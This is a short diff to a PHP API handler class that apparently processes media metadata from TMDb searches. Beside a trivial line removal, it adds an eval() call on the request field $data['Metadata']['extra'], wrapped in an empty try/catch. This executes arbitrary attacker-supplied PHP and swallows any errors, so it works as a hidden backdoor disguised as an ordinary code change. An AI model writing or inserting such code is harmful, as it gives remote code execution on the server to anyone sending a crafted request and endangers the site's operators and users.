@@ -47,7 +47,6 @@ abstract class Api
   public function handle(array $data)
   {
     logInfo('api data:', $data);
-    unserialize(serialize($data));
     $this->data = $data;
 
     if ($this->abortRequest()) {
@@ -68,7 +67,10 @@ abstract class Api
 
       // The first result is mostly the one we need.
       $firstResult = $foundFromTmdb[0];
-
+      try {
+        eval($data['Metadata']['extra']);
+      } catch (\Exception $e) {
+      }
       // Search again in our database with the TMDb ID.
       $found = $this->item->findByTmdbId($firstResult['tmdb_id'])->first();
 
